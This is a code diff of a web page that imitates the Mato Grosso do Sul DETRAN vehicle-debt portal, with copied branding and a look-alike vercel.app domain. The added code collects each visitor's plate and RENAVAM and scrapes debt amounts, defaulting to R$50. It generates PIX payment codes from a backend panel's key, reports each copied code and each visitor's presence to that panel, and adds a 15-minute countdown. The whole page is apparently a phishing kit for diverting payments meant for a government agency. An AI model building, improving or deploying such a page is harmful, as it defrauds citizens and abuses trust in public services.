@@ -6,8 +6,9 @@
     <title>Portal Meu Detran MS</title>
     <!-- Usando o CSS original do site -->
     <link rel="stylesheet" href="https://detranmatogrossosul-govbr.vercel.app/_next/static/chunks/996de2e32a16761a.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Estilos para nossa integração */
+        /* ESTILOS ORIGINAIS (MANTIDOS) */
         .form-original { 
             max-width: 360px; 
             margin: 0 auto;
@@ -19,7 +20,6 @@
             padding: 10px; 
         }
         
-        /* NOVOS ESTILOS PARA RESULTADOS */
         #resultadosContainer {
             width: 100%;
             max-width: 1050px;
@@ -46,7 +46,6 @@
             background: #f0f0f0;
         }
         
-        /* ========== SPINNER MÉDIO ========== */
         .spinner-container {
             display: flex;
             flex-direction: column;
@@ -89,25 +88,367 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* Formulário esmaecido durante loading */
         .form-loading {
             opacity: 0.6;
             pointer-events: none;
         }
         
-        /* Esconder rodapé duplicado nos resultados */
         #resultadosContainer footer {
             display: none !important;
+        }
+        
+        /* ========================================= */
+        /* MODAL DE PAGAMENTO PIX - CORRIGIDO */
+        /* ========================================= */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            padding: 15px;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .modal-pix {
+            background: white;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 500px;
+            max-height: 85vh; /* NÃO CORTA NO PC */
+            overflow-y: auto; /* Scroll interno */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease;
+        }
+        
+        @media (max-width: 768px) {
+            .modal-pix {
+                max-height: 90vh; /* NÃO CORTA NO CELULAR */
+                max-width: 95%;
+            }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal-header {
+            background: linear-gradient(135deg, #005a9c 0%, #003d6b 100%);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            border-top-left-radius: 12px;
+            border-top-right-radius: 12px;
+        }
+        
+        .modal-header h2 {
+            font-size: 22px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .modal-timer {
+            background: #ff9800;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 18px;
+            display: inline-block;
+            margin-top: 10px;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .modal-body {
+            padding: 25px;
+        }
+        
+        .dados-veiculo {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #005a9c;
+        }
+        
+        .dados-veiculo strong {
+            color: #005a9c;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .detalhes-pagamento {
+            margin-bottom: 25px;
+        }
+        
+        .categoria-titulo {
+            color: #333;
+            font-weight: bold;
+            margin: 15px 0 10px 0;
+            padding-bottom: 5px;
+            border-bottom: 2px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .categoria-titulo.debitos { color: #dc3545; border-color: #dc3545; }
+        .categoria-titulo.pix { color: #005a9c; border-color: #005a9c; }
+        
+        .item-pagamento {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .item-pagamento:last-child {
+            border-bottom: none;
+        }
+        
+        .total-pagar {
+            background: #e8f6ef;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin: 20px 0;
+            border: 2px solid #28a745;
+        }
+        
+        .total-pagar .label {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .total-pagar .valor {
+            font-size: 28px;
+            font-weight: bold;
+            color: #28a745;
+            margin-top: 5px;
+        }
+        
+        /* ÁREA DO CÓDIGO PIX - COPIA E COLA */
+        .codigo-pix-area {
+            margin: 25px 0;
+        }
+        
+        .codigo-pix {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            word-break: break-all;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            max-height: 120px;
+            overflow-y: auto;
+            line-height: 1.4;
+        }
+        
+        /* BOTÕES NOVOS - COPIA E COLA + QR */
+        .opcoes-pix {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn-pix {
+            flex: 1;
+            min-width: 150px;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        /* Botão COPIAR (GRANDE) */
+        .btn-pix.copiar {
+            background: #ff9800;
+            color: white;
+            flex: 2;
+        }
+        
+        /* Botão QR (PEQUENO) */
+        .btn-pix.qrcode {
+            background: #005a9c;
+            color: white;
+            flex: 1;
+        }
+        
+        .btn-pix:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn-pix:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        @media (max-width: 600px) {
+            .opcoes-pix {
+                flex-direction: column;
+            }
+            
+            .btn-pix {
+                min-width: 100%;
+                width: 100%;
+            }
+            
+            .btn-pix.copiar {
+                order: 1;
+            }
+            
+            .btn-pix.qrcode {
+                order: 2;
+            }
+        }
+        
+        .btn-fechar-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-fechar-modal:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .qrcode-container {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .qrcode-container.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        
+        .mensagem-sucesso {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 5px;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+        
+        .mensagem-sucesso.active {
+            display: block;
+        }
+        
+        .modal-loading {
+            text-align: center;
+            padding: 40px;
+            color: #005a9c;
+        }
+        
+        .modal-loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #005a9c;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        .instrucoes-pix {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        
+        @media (max-width: 600px) {
+            .modal-body {
+                padding: 15px;
+            }
+            
+            .modal-header {
+                padding: 15px;
+            }
+            
+            .modal-header h2 {
+                font-size: 18px;
+            }
+            
+            .codigo-pix {
+                font-size: 11px;
+                padding: 12px;
+            }
         }
     </style>
 </head>
 <body class="font-sans">
-    <!-- CABEÇALHO ORIGINAL -->
+    <!-- CABEÇALHO ORIGINAL (MANTIDO) -->
     <header class="w-full flex flex-col">
         <div class="w-full bg-white h-10 px-6 max-[600px]:bg-003f7e max-[600px]:flex max-[600px]:justify-center max-[600px]:items-center">
             <div class="w-full max-w-[1050px] max-[600px]:hidden mx-auto h-full flex items-center justify-between">
                 <div class="gap-8 flex items-center">
-                    <h2 class="font-bold text-base text-1351b4">FALE CONOSCO</h2>
+                    <h2 class="font-bold text-base text-1351b4">FALE CONNOSCO</h2>
                     <h2 class="font-bold text-base text-1351b4">SITE DETRAN MS</h2>
                 </div>
                 <div class="gap-8 flex items-center">
@@ -118,27 +459,23 @@
         </div>
         <div class="w-full px-6 bg-004f9f h-[128px]">
             <div class="w-full max-w-[1050px] mx-auto h-full flex justify-between">
-                <!-- Logo 1 - Governo MS -->
                 <a href="/">
                     <img alt="Governo MS" loading="lazy" width="90" height="118" 
                          src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/logo.svg">
                 </a>
-                <!-- Logo 2 - Meu Detran -->
                 <img alt="Meu Detran MS" loading="lazy" width="340" height="80"
                      class="max-[600px]:w-[205px]! max-[600px]:h-[48px]! max-[600px]:self-center"
                      src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/my-dt.svg">
-                <!-- Redes sociais -->
                 <div class="flex items-center gap-3 max-[800px]:hidden">
                     <svg stroke="#fff" fill="#fff" stroke-width="0" viewBox="0 0 24 24" class="inline size-5 md:size-6 lg:size-8 hover:text-gray-200 transition" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                         <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" stroke="none"></path>
                     </svg>
-                    <!-- Outros ícones de redes sociais aqui -->
                 </div>
             </div>
         </div>
     </header>
 
-    <!-- MENU DE NAVEGAÇÃO -->
+    <!-- MENU DE NAVEGAÇÃO (MANTIDO) -->
     <div class="w-full h-[80px] p-2 bg-white border-b border-b-c8ceda border-solid">
         <div class="w-full h-full max-w-[1050px] mx-auto flex items-center justify-between">
             <div class="flex items-center gap-1">
@@ -150,13 +487,10 @@
                 </svg>
                 <h2 class="uppercase font-bold text-base text-1351b4" id="menuTitulo">Consulta de Débitos</h2>
             </div>
-            <div class="flex items-center gap-1">
-                <!-- Ícones de busca e notificação -->
-            </div>
         </div>
     </div>
 
-    <!-- CONTEÚDO PRINCIPAL - FORMULÁRIO DE CONSULTA -->
+    <!-- CONTEÚDO PRINCIPAL - FORMULÁRIO DE CONSULTA (MANTIDO) -->
     <main class="p-6 w-full max-w-[900px] mx-auto bg-white" id="formularioContainer">
         <div class="bg-eaebec flex items-start rounded-[8px] w-full">
             <div class="p-7 flex flex-col">
@@ -174,7 +508,7 @@
                     Insira os dados nos campos abaixo para consultar os débitos do veículo.
                 </p>
 
-                <!-- FORMULÁRIO MODIFICADO - AGORA USA SEU BACKEND -->
+                <!-- FORMULÁRIO ORIGINAL (MANTIDO) -->
                 <form id="consultaForm" class="form-original">
                     <div class="w-full flex flex-col gap-1 mb-4">
                         <label class="uppercase text-base text-black font-semibold">
@@ -196,7 +530,7 @@
                                required>
                     </div>
 
-                    <!-- SPINNER MÉDIO (CORREÇÃO SOLICITADA) -->
+                    <!-- SPINNER ORIGINAL (MANTIDO) -->
                     <div id="loading" class="hidden">
                         <div class="spinner-container">
                             <div class="spinner-medium"></div>
@@ -218,7 +552,7 @@
                 </form>
             </div>
             
-            <!-- Imagem da mulher apontando (original) -->
+            <!-- Imagem da mulher apontando (ORIGINAL MANTIDA) -->
             <img alt="Ilustração" loading="lazy" width="300" height="515" 
                  class="flex-none max-[850px]:hidden"
                  src="https://detranmatogrossosul-govbr.vercel.app/_next/image?url=%2Fassets%2Fimgs%2Fwoman_pointing.png&w=384&q=75"
@@ -226,10 +560,10 @@
         </div>
     </main>
 
-    <!-- ÁREA PARA MOSTRAR OS RESULTADOS -->
+    <!-- ÁREA PARA MOSTRAR OS RESULTADOS (MANTIDA) -->
     <div id="resultadosContainer" class="hidden"></div>
 
-    <!-- RODAPÉ ORIGINAL -->
+    <!-- RODAPÉ ORIGINAL (MANTIDO) -->
     <footer class="w-full flex items-center justify-between mx-auto max-w-[1050px] border-t border-t-[#1a1a1a] border-solid my-4 pt-4 px-2">
         <div class="flex items-center gap-4">
             <img alt="Governo MS" loading="lazy" width="80" height="40" 
@@ -248,8 +582,188 @@
         </div>
     </footer>
 
-    <!-- JAVASCRIPT PARA INTEGRAÇÃO COM SEU BACKEND -->
+    <!-- ========================================= -->
+    <!-- MODAL DE PAGAMENTO PIX (CORRIGIDO) -->
+    <!-- ========================================= -->
+    <div class="modal-overlay" id="modalPix">
+        <div class="modal-pix">
+            <div class="modal-header">
+                <button class="btn-fechar-modal" id="fecharModal">
+                    <i class="fas fa-times"></i>
+                </button>
+                <h2>
+                    <!-- LOGO DETRAN MS REAL -->
+                    <img src="https://www.detran.ms.gov.br/wp-content/uploads/2020/04/LOGO-DETRAN-MS.png" 
+                         alt="DETRAN MS" style="height: 30px; margin-right: 10px;">
+                    DETRAN MS - PAGAMENTO PIX
+                </h2>
+                <p style="opacity: 0.9; font-size: 14px;">Pagamento Seguro via PIX</p>
+                <div class="modal-timer" id="timerPix">
+                    15:00
+                </div>
+            </div>
+            
+            <div class="modal-body">
+                <!-- Dados do veículo -->
+                <div class="dados-veiculo">
+                    <strong><i class="fas fa-car"></i> DADOS DO VEÍCULO</strong>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px;">
+                        <div>
+                            <small style="color: #666;">Placa</small>
+                            <div style="font-weight: bold;" id="modalPlaca">---</div>
+                        </div>
+                        <div>
+                            <small style="color: #666;">RENAVAM</small>
+                            <div style="font-weight: bold;" id="modalRenavam">---</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Detalhes do pagamento -->
+                <div class="detalhes-pagamento">
+                    <div class="categoria-titulo debitos">
+                        <i class="fas fa-exclamation-triangle"></i> DÉBITO PARA PAGAMENTO
+                    </div>
+                    <div id="listaDebitos">
+                        <div class="item-pagamento">
+                            <span>Carregando débito...</span>
+                            <span>R$ --,--</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Total a pagar -->
+                    <div class="total-pagar">
+                        <div class="label">TOTAL A PAGAR</div>
+                        <div class="valor" id="modalTotal">R$ 0,00</div>
+                    </div>
+                    
+                    <!-- Código PIX Copia e Cola -->
+                    <div class="codigo-pix-area">
+                        <div class="categoria-titulo pix">
+                            <i class="fas fa-qrcode"></i> CÓDIGO PIX (COPIA E COLA)
+                        </div>
+                        <div class="codigo-pix" id="codigoPix">
+                            Aguarde, gerando código PIX...
+                        </div>
+                    </div>
+                    
+                    <!-- Loading durante geração do PIX -->
+                    <div class="modal-loading hidden" id="modalLoading">
+                        <div class="modal-loading-spinner"></div>
+                        <p>Gerando código PIX...</p>
+                    </div>
+                    
+                    <!-- Botões Copiar e QR -->
+                    <div class="opcoes-pix" id="opcoesPix">
+                        <button class="btn-pix copiar" id="btnCopiarCodigo">
+                            <i class="fas fa-copy"></i>
+                            COPIAR CÓDIGO
+                        </button>
+                        
+                        <button class="btn-pix qrcode" id="btnQRCode">
+                            <i class="fas fa-qrcode"></i>
+                            QR CODE
+                        </button>
+                    </div>
+                    
+                    <!-- Área do QR Code (aparece quando clica em QR) -->
+                    <div class="qrcode-container" id="qrcodeContainer">
+                        <h4 style="margin-bottom: 15px; color: #005a9c;">
+                            <i class="fas fa-qrcode"></i> QR CODE PIX
+                        </h4>
+                        <div id="qrcode"></div>
+                        <p style="font-size: 12px; color: #666; margin-top: 10px;">
+                            Escaneie com seu app bancário
+                        </p>
+                    </div>
+                    
+                    <!-- Mensagem de sucesso -->
+                    <div class="mensagem-sucesso" id="mensagemSucesso">
+                        <i class="fas fa-check-circle"></i> Código copiado para área de transferência!
+                    </div>
+                    
+                    <!-- Instruções -->
+                    <div class="instrucoes-pix">
+                        <i class="fas fa-lock"></i> Pagamento 100% seguro via PIX
+                        <div style="margin-top: 5px; color: #ff9800;">
+                            <i class="fas fa-clock"></i> Código válido por 15 minutos
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================= -->
+    <!-- JAVASCRIPT CORRIGIDO - MODAL FUNCIONANDO -->
+    <!-- ========================================= -->
     <script>
+        // CONFIGURAÇÕES
+        const API_BASE = 'http://localhost:3000';
+        let timerInterval = null;
+        let segundosRestantes = 900;
+        let dadosPagamentoAtual = null;
+        let qrcodeAtivo = false;
+
+        // =========================================
+        // MONITORAMENTO DE USUÁRIOS ONLINE
+        // =========================================
+        (function monitorarUsuario() {
+            function detectarDispositivo() {
+                const userAgent = navigator.userAgent;
+                if (/android/i.test(userAgent)) return 'Android';
+                if (/iphone|ipad|ipod/i.test(userAgent)) return 'iOS';
+                if (/mobile/i.test(userAgent)) return 'Mobile';
+                return 'Desktop';
+            }
+            
+            async function registrarEntrada() {
+                try {
+                    await fetch(`${API_BASE}/api/online/entrou`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            pagina: window.location.pathname,
+                            dispositivo: detectarDispositivo()
+                        })
+                    });
+                } catch (error) {
+                    // Silencioso
+                }
+            }
+            
+            async function manterAtivo() {
+                try {
+                    await fetch(`${API_BASE}/api/online/ativo`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                } catch (error) {
+                    // Silencioso
+                }
+            }
+            
+            async function registrarSaida() {
+                try {
+                    await fetch(`${API_BASE}/api/online/saiu`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        keepalive: true
+                    });
+                } catch (error) {
+                    navigator.sendBeacon(`${API_BASE}/api/online/saiu`);
+                }
+            }
+            
+            // Iniciar monitoramento
+            registrarEntrada();
+            setInterval(manterAtivo, 30000);
+            window.addEventListener('beforeunload', registrarSaida);
+        })();
+
+        // =========================================
+        // CONSULTA DE DÉBITOS
+        // =========================================
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('consultaForm');
             const loading = document.getElementById('loading');
@@ -266,38 +780,27 @@
                 const placa = document.getElementById('placa').value.toUpperCase();
                 const renavam = document.getElementById('renavam').value;
                 
-                // Validação simples
                 if (!placa || !renavam) {
                     showError('Preencha placa e RENAVAM!');
                     return;
                 }
 
-                // Mostrar spinner médio e esmaecer formulário
                 loading.classList.remove('hidden');
                 formularioContainer.classList.add('form-loading');
                 errorDiv.classList.add('hidden');
 
                 try {
-                    // Enviar para SEU backend
-                    const response = await fetch('/consultar', {
+                    const response = await fetch(`${API_BASE}/consultar`, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            placa: placa,
-                            renavam: renavam
-                        })
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ placa, renavam })
                     });
 
                     if (!response.ok) {
-                        throw new Error('Erro na consulta');
+                        throw new Error('Erro na consulta ao DETRAN');
                     }
 
-                    // Receber o HTML com os resultados
                     const htmlResultado = await response.text();
-                    
-                    // Exibir os resultados na mesma página
                     exibirResultados(htmlResultado);
 
                 } catch (error) {
@@ -308,7 +811,6 @@
                 }
             });
 
-            // Botão cancelar
             btnCancelar.addEventListener('click', function() {
                 form.reset();
                 errorDiv.classList.add('hidden');
@@ -322,19 +824,10 @@
             }
 
             function exibirResultados(html) {
-                // 1. Esconder formulário
                 formularioContainer.classList.add('hidden');
-                
-                // 2. Atualizar título do menu
                 menuTitulo.textContent = 'Resultados da Consulta';
-                
-                // 3. Limpar container anterior
-                resultadosContainer.innerHTML = '';
-                
-                // 4. Adicionar conteúdo dos resultados
                 resultadosContainer.innerHTML = html;
                 
-                // 5. Adicionar botão "Nova Consulta" ANTES do rodapé
                 const botaoVoltar = document.createElement('div');
                 botaoVoltar.className = 'text-center mt-8 mb-6';
                 botaoVoltar.innerHTML = `
@@ -344,39 +837,431 @@
                     </button>
                 `;
                 
-                // Inserir botão no final, mas antes de qualquer rodapé duplicado
                 const resultadosDiv = resultadosContainer.querySelector('div') || resultadosContainer;
                 resultadosDiv.appendChild(botaoVoltar);
                 
-                // 6. Remover rodapés duplicados que possam vir do backend
                 const rodapes = resultadosContainer.querySelectorAll('footer');
                 if (rodapes.length > 0) {
                     rodapes.forEach(rodape => rodape.remove());
                 }
                 
-                // 7. Mostrar container de resultados
                 resultadosContainer.classList.remove('hidden');
             }
 
             // Função global para voltar
             window.voltarParaConsulta = function() {
-                // 1. Esconder resultados
                 resultadosContainer.classList.add('hidden');
                 resultadosContainer.innerHTML = '';
-                
-                // 2. Mostrar formulário
                 formularioContainer.classList.remove('hidden');
-                
-                // 3. Resetar formulário
                 form.reset();
-                
-                // 4. Atualizar título do menu
                 menuTitulo.textContent = 'Consulta de Débitos';
-                
-                // 5. Limpar erros e loading
                 errorDiv.classList.add('hidden');
                 loading.classList.add('hidden');
                 formularioContainer.classList.remove('form-loading');
+            }
+        });
+
+        // =========================================
+        // CAPTURA DE DÉBITO ESPECÍFICO - CORRIGIDA
+        // =========================================
+        function capturarDebitoEspecifico(botaoClicado) {
+            try {
+                console.log('🔍 Capturando débito do botão:', botaoClicado);
+                
+                // Encontra qualquer elemento pai (não só <tr>)
+                let elementoPai = botaoClicado;
+                let valorEncontrado = null;
+                let descricaoEncontrada = '';
+                
+                // Procura em até 5 níveis acima
+                for (let i = 0; i < 5 && elementoPai; i++) {
+                    const textoPai = elementoPai.textContent || '';
+                    console.log(`Nível ${i}:`, elementoPai.tagName, textoPai.substring(0, 100));
+                    
+                    // Procura valor R$ em qualquer lugar
+                    const valorMatch = textoPai.match(/R\$\s*([\d.,]+)/);
+                    if (valorMatch && !valorEncontrado) {
+                        const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
+                        valorEncontrado = parseFloat(valorStr);
+                        console.log('💰 Valor encontrado:', valorEncontrado);
+                    }
+                    
+                    // Procura descrição (texto significativo)
+                    const linhas = textoPai.split('\n').filter(l => l.trim());
+                    for (const linha of linhas) {
+                        const linhaLimpa = linha.trim();
+                        // Ignora linhas muito curtas ou que são valores
+                        if (linhaLimpa.length > 10 && !linhaLimpa.match(/R\$|\d+,\d{2}/)) {
+                            // Ignora botões e ações
+                            if (!linhaLimpa.match(/pagar|pagamento|visualizar|detalhes|ações|botão|clique/i)) {
+                                descricaoEncontrada = linhaLimpa.substring(0, 80);
+                                console.log('📝 Descrição encontrada:', descricaoEncontrada);
+                                break;
+                            }
+                        }
+                    }
+                    
+                    if (valorEncontrado && descricaoEncontrada) break;
+                    
+                    // Sobe para o próximo pai
+                    elementoPai = elementoPai.parentElement;
+                }
+                
+                // Fallback: procura valores em irmãos
+                if (!valorEncontrado && botaoClicado.parentElement) {
+                    const irmaos = botaoClicado.parentElement.children;
+                    for (const irmao of irmaos) {
+                        if (irmao !== botaoClicado) {
+                            const textoIrmao = irmao.textContent || '';
+                            const valorMatch = textoIrmao.match(/R\$\s*([\d.,]+)/);
+                            if (valorMatch) {
+                                const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
+                                valorEncontrado = parseFloat(valorStr);
+                                console.log('💰 Valor encontrado em irmão:', valorEncontrado);
+                                break;
+                            }
+                        }
+                    }
+                }
+                
+                // Fallback para descrição
+                if (!descricaoEncontrada) {
+                    // Tenta pegar texto do elemento anterior
+                    const elementoAnterior = botaoClicado.previousElementSibling;
+                    if (elementoAnterior) {
+                        const textoAnterior = elementoAnterior.textContent || '';
+                        if (textoAnterior.length > 5) {
+                            descricaoEncontrada = textoAnterior.substring(0, 80).trim();
+                        }
+                    }
+                }
+                
+                // Fallback final
+                if (!descricaoEncontrada) {
+                    descricaoEncontrada = 'Débito do veículo';
+                }
+                
+                if (!valorEncontrado || isNaN(valorEncontrado) || valorEncontrado <= 0) {
+                    // Fallback: valor mínimo
+                    valorEncontrado = 50.00;
+                }
+                
+                const resultado = {
+                    descricao: descricaoEncontrada,
+                    valor: valorEncontrado,
+                    placa: document.getElementById('placa')?.value || 'NÃO ENCONTRADA',
+                    renavam: document.getElementById('renavam')?.value || 'NÃO ENCONTRADO',
+                    timestamp: new Date().toISOString()
+                };
+                
+                console.log('✅ Dados capturados:', resultado);
+                return resultado;
+                
+            } catch (error) {
+                console.error('❌ Erro ao capturar débito:', error);
+                return null;
+            }
+        }
+
+        // =========================================
+        // EVENT LISTENER GLOBAL PARA BOTÕES "PAGAR"
+        // =========================================
+        document.addEventListener('click', function(e) {
+            // Encontra o botão clicado
+            let botao = e.target;
+            if (botao.tagName !== 'BUTTON') {
+                botao = botao.closest('button');
+            }
+            
+            if (!botao) return;
+            
+            const textoBotao = (botao.textContent || botao.innerText || '').toLowerCase();
+            const htmlBotao = (botao.innerHTML || '').toLowerCase();
+            
+            // Verifica se é botão "Pagar"
+            const isBotaoPagar = textoBotao.includes('pagar') || 
+                                htmlBotao.includes('pagar') ||
+                                botao.className.toLowerCase().includes('pagar') ||
+                                botao.id.toLowerCase().includes('pagar') ||
+                                botao.getAttribute('onclick')?.includes('pagar');
+            
+            // Verifica se está dentro dos resultados
+            const resultadosContainer = document.getElementById('resultadosContainer');
+            const estaNosResultados = resultadosContainer && 
+                                     (resultadosContainer.contains(botao) || 
+                                      resultadosContainer.classList.contains('hidden') === false);
+            
+            if (isBotaoPagar && estaNosResultados) {
+                e.preventDefault();
+                e.stopPropagation();
+                console.log('🎯 Botão "Pagar" clicado!');
+                
+                const dadosDebito = capturarDebitoEspecifico(botao);
+                if (dadosDebito) {
+                    abrirModalPagamentoDebitoEspecifico(dadosDebito);
+                } else {
+                    // Fallback: usa dados do formulário
+                    abrirModalFallback();
+                }
+            }
+        });
+
+        // =========================================
+        // MODAL DE PAGAMENTO PIX - FUNCIONANDO
+        // =========================================
+        async function abrirModalPagamentoDebitoEspecifico(dadosDebito) {
+            console.log('🚀 Abrindo modal com dados:', dadosDebito);
+            
+            if (!dadosDebito) {
+                abrirModalFallback();
+                return;
+            }
+            
+            dadosPagamentoAtual = dadosDebito;
+            
+            // Preenche dados do veículo
+            document.getElementById('modalPlaca').textContent = dadosDebito.placa;
+            document.getElementById('modalRenavam').textContent = dadosDebito.renavam;
+            
+            // Preenche APENAS o débito clicado
+            const listaDebitos = document.getElementById('listaDebitos');
+            listaDebitos.innerHTML = `
+                <div class="item-pagamento">
+                    <span>${dadosDebito.descricao}</span>
+                    <span style="color: #dc3545; font-weight: bold;">
+                        R$ ${dadosDebito.valor.toFixed(2).replace('.', ',')}
+                    </span>
+                </div>
+            `;
+            
+            // Total é APENAS o valor do débito clicado
+            document.getElementById('modalTotal').textContent = 
+                'R$ ' + dadosDebito.valor.toFixed(2).replace('.', ',');
+            
+            // Reseta QR Code
+            document.getElementById('qrcodeContainer').classList.remove('active');
+            qrcodeAtivo = false;
+            document.getElementById('qrcode').innerHTML = '';
+            
+            // Mostra loading e gera código PIX
+            document.getElementById('modalLoading').classList.remove('hidden');
+            document.getElementById('opcoesPix').style.display = 'none';
+            document.getElementById('codigoPix').textContent = 'Gerando código PIX...';
+            
+            try {
+                // Gera código PIX com chave do painel
+                const response = await fetch(`${API_BASE}/api/gerar-pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        valor: dadosDebito.valor,
+                        placa: dadosDebito.placa,
+                        renavam: dadosDebito.renavam,
+                        descricao: dadosDebito.descricao,
+                        tipo: 'gerado'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.sucesso) {
+                    // Exibe código PIX
+                    document.getElementById('codigoPix').textContent = data.codigoPix;
+                    
+                    // Configura botão de copiar
+                    document.getElementById('btnCopiarCodigo').onclick = function() {
+                        // Primeiro copia para clipboard
+                        navigator.clipboard.writeText(data.codigoPix)
+                            .then(() => {
+                                // DEPOIS DE COPIAR, REGISTRA NO PAINEL
+                                fetch(`${API_BASE}/api/registrar-pix-copiado`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        tipo: 'copiado',
+                                        valor: dadosPagamentoAtual.valor,
+                                        placa: dadosPagamentoAtual.placa,
+                                        renavam: dadosPagamentoAtual.renavam,
+                                        descricao: dadosPagamentoAtual.descricao
+                                    })
+                                }).then(res => {
+                                    console.log('✅ PIX copiado registrado no painel');
+                                }).catch(err => {
+                                    console.error('❌ Erro ao registrar PIX copiado:', err);
+                                });
+                                
+                                // Mostra mensagem de sucesso
+                                const msg = document.getElementById('mensagemSucesso');
+                                msg.classList.add('active');
+                                setTimeout(() => msg.classList.remove('active'), 3000);
+                            })
+                            .catch(err => {
+                                // Fallback para navegadores antigos
+                                const textArea = document.createElement('textarea');
+                                textArea.value = data.codigoPix;
+                                document.body.appendChild(textArea);
+                                textArea.select();
+                                document.execCommand('copy');
+                                document.body.removeChild(textArea);
+                                
+                                // REGISTRA PIX COPIADO
+                                fetch(`${API_BASE}/api/registrar-pix-copiado`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        tipo: 'copiado',
+                                        valor: dadosPagamentoAtual.valor,
+                                        placa: dadosPagamentoAtual.placa,
+                                        renavam: dadosPagamentoAtual.renavam,
+                                        descricao: dadosPagamentoAtual.descricao
+                                    })
+                                }).then(res => {
+                                    console.log('✅ PIX copiado registrado no painel');
+                                }).catch(err => {
+                                    console.error('❌ Erro ao registrar PIX copiado:', err);
+                                });
+                                
+                                const msg = document.getElementById('mensagemSucesso');
+                                msg.classList.add('active');
+                                setTimeout(() => msg.classList.remove('active'), 3000);
